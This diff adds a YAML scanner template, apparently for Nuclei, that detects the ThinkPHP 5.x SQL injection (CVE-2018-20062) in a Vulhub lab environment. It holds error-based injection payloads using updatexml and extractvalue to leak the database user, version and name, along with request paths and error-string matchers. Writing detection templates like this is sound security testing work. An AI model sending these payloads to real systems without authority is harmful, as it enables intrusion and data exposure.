@@ -1,0 +1,55 @@
+id: in-sqlijection
+info:
+  name: Vulhub In-SQLInjection (ThinkPHP 5.x SQLi)
+  severity: Critical
+  description: |
+    VULHUB in-sqlinjection 靶场专用检测插件。
+    ThinkPHP 5.x 版本中存在的 SQL 注入漏洞 (CVE-2018-20062)。
+    漏洞存在于数组参数的 SQL 查询处理中，攻击者可通过构造恶意参数执行 SQL 注入攻击。
+    影响版本: ThinkPHP 5.0.x < 5.0.24, 5.1.x < 5.1.31
+  tags:
+    - vulhub
+    - in-sqlijection
+    - thinkphp
+    - sqli
+    - updatexml
+  reference:
+    - https://github.com/vulhub/vulhub/tree/master/thinkphp/in-sqlinjection
+    - https://vulhub.org/#/environments/thinkphp/in-sqlinjection/
+
+payload_sets:
+  default:
+    - "0,updatexml(0,concat(0xa,user()),0)"
+    - "0,updatexml(0,concat(0xa,version()),0)"
+  aggressive:
+    - "0,updatexml(0,concat(0xa,user()),0)"
+    - "0,updatexml(0,concat(0xa,version()),0)"
+    - "0,updatexml(0,concat(0xa,database()),0)"
+    - "0,extractvalue(1,concat(0xa,user()))"
+    - "0,extractvalue(1,concat(0xa,version()))"
+    - "1) and updatexml(1,concat(0xa,database()),1)"
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?ids[{{payload}}]=1"
+      - "{{BaseURL}}/?s=/index/index/index&ids[{{payload}}]=1"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "XPATH syntax error"
+          - "XPATH syntax error:"
+          - "extractvalue()"
+          - "updatexml()"
+          - "SQLSTATE[42"
+          - "SQLSTATE[HY000]: General error"
+          - "Think\\Db\\Exception"
+          - "PDOException"
+          - "Connection.php line"
+          - "Query.php line"
+          - "Call Stack"
+        condition: or
+        part: body
+      - type: status
+        status: [500, 200]
